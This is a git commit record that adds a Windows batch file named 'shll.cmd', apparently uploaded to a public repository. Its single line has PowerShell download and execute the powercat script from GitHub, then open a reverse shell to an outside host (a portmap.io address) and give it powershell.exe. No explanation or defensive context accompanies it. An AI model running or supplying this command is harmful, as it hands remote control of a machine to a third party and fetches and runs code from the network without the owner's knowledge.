bed903266987cb7d7307cdd39e13137b71644cb5
walid-XD <77286857+walid-XD@users.noreply.github.com>
2022-03-18 22:58:23 +0100

    Add files via upload

---
+++ shll.cmd
@@ -0,0 +1,2 @@
+powershell -c IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c rxrt-50426.portmap.io -p 50426 -e powershell.exe"
+
